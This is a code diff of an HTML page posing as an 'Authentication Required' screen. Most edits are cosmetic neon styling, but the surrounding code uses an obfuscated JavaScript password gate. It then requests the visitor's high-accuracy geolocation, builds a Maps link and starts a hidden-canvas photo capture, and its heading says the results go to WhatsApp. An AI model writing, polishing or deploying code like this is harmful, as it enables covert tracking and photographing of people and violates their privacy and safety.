@@ -5,27 +5,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Authentication Required</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
-        #main-content { display: none; }
+        /* 🌟 Modern Neon-Themed Styles */
+        body {
+            font-family: 'Poppins', sans-serif;
+            text-align: center;
+            background: #0d1117;
+            color: #ffffff;
+            margin: 50px;
+        }
+        input, button {
+            padding: 10px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            transition: 0.3s;
+        }
+        input {
+            background: #161b22;
+            color: #ffffff;
+            outline: none;
+            border: 1px solid #58a6ff;
+        }
+        button {
+            background: #58a6ff;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0px 0px 10px #58a6ff;
+        }
+        button:hover {
+            transform: scale(1.1);
+            box-shadow: 0px 0px 20px #58a6ff;
+        }
+        #auth-section {
+            animation: fadeIn 1s ease-in-out;
+        }
+        #main-content {
+            display: none;
+            animation: fadeIn 1s ease-in-out;
+        }
+        #status {
+            font-size: 20px;
+            font-weight: bold;
+            animation: glow 1s infinite alternate;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes glow {
+            from { color: #58a6ff; }
+            to { color: #ffffff; }
+        }
     </style>
 </head>
 <body>
     <div id="auth-section">
-        <h2>Enter Password to Access</h2>
+        <h2>🔒 Enter Password to Access</h2>
         <input type="password" id="p-a" placeholder="Enter password">
         <button onclick="x1x()">Submit</button>
         <p id="a-s" style="color: red;"></p>
     </div>
 
     <div id="main-content">
-        <h1>Sending Live Location & Photo to WhatsApp...</h1>
+        <h1>📡 Sending Live Location & Photo to WhatsApp...</h1>
         <p id="status">Initializing...</p>
         <canvas id="canvas" style="display: none;"></canvas>
     </div>
 
     <script>
         (function(){
-            var _0xabc=["value","getElementById","p-a","style","display","none","block","auth-section","main-content","Incorrect password!","innerText","b1b3773a05c0ed0176787a4f1574ff0075f7521e"];
+            var _0xabc=["value","getElementById","p-a","style","display","none","block","auth-section","main-content","Incorrect password!","innerText","aa385a04b8f503c6b319cd48de2a41e4522c1ae2d0c94f7fa26b90e50faeb3b2"];
             
             async function x1x(){
                 const _p=document[_0xabc[1]](_0xabc[2])[_0xabc[0]];
@@ -50,11 +100,11 @@
                     (p)=>{
                         var lat=p.coords.latitude,lng=p.coords.longitude;
                         var loc=`https://www.google.com/maps?q=${lat},${lng}`;
-                        document.getElementById("status").innerText="Location found! Taking photo...";
+                        document.getElementById("status").innerText="✅ Location found! Taking photo...";
                         x4x(loc);
                     },
                     (err)=>{
-                        document.getElementById("status").innerText="Error getting location: "+err.message;
+                        document.getElementById("status").innerText="❌ Error getting location: "+err.message;
                     },
                     { enableHighAccuracy: true, maximumAge: 0 }
                 );
